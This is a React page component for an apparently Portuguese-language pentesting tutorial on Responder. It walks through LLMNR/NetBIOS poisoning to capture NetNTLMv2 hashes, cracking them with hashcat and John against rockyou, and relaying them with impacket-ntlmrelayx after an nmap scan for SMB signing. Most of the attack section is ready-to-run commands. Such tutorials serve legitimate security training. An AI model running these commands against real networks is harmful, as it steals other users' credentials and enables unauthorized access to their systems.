import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Responder() {
    return (
      <PageContainer
        title="Responder — Captura de Hashes NTLM"
        subtitle="Capture hashes NetNTLM de sistemas Windows na rede local e quebre-os offline."
        difficulty="avancado"
        timeToRead="12 min"
      >
        <AlertBox type="danger" title="Uso apenas em labs autorizados">
          Responder captura credenciais de outros usuários na rede. Uso não autorizado é crime grave.
        </AlertBox>

        <h2>O que é o Responder?</h2>
        <p>
          Responder abusa de protocolos de resolução de nomes no Windows (LLMNR, NetBIOS-NS, mDNS)
          para se tornar um servidor falso. Quando um Windows tenta resolver um nome e falha via DNS,
          usa esses protocolos alternativos — o Responder responde a TUDO, forçando a autenticação NTLM.
        </p>

        <h2>Instalação</h2>
        <CodeBlock language="bash" code={'# Já instalado no Kali\nresponder --version\n\n# Localização\nwhich responder\nls /usr/share/responder/'} />

        <h2>Uso Básico</h2>
        <CodeBlock language="bash" code={'# Modo básico — escutar em interface de rede\nsudo responder -I eth0\n\n# Modo analítico (sem envenenar — apenas observar)\nsudo responder -I eth0 -A\n\n# Com força bruta de NTLM\nsudo responder -I eth0 -b\n\n# Verbose\nsudo responder -I eth0 -v'} />

        <h2>Interpretar os Hashes Capturados</h2>
        <CodeBlock language="bash" code={'# Os hashes ficam em:\ncat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.100.txt\nls /usr/share/responder/logs/\n\n# Formato do hash NTLMv2:\n# usuario::DOMINIO:challenge:response:blob\n\n# Quebrar com Hashcat\nhashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n\n# Quebrar com John\njohn --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'} />

        <h2>NTLM Relay — Sem Precisar Quebrar</h2>
        <CodeBlock language="bash" code={'# Se SMB signing estiver desabilitado, fazer relay direto!\n\n# 1. Desabilitar SMB e HTTP no Responder (para o relay funcionar)\nnano /etc/responder/Responder.conf\n# SMB = Off\n# HTTP = Off\n\n# 2. Iniciar Responder\nsudo responder -I eth0 -rdw\n\n# 3. Em outro terminal, iniciar ntlmrelayx (impacket)\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# 4. Verificar quais hosts têm SMB signing desabilitado\nnmap --script smb2-security-mode.nse -p 445 192.168.1.0/24'} />

        <AlertBox type="success" title="Próximos passos">
          Com credenciais capturadas: quebre offline com Hashcat (NTLMv2 é quebrável),
          ou faça relay para acessar outros sistemas sem precisar da senha em texto.
        </AlertBox>
      </PageContainer>
    );
  }
  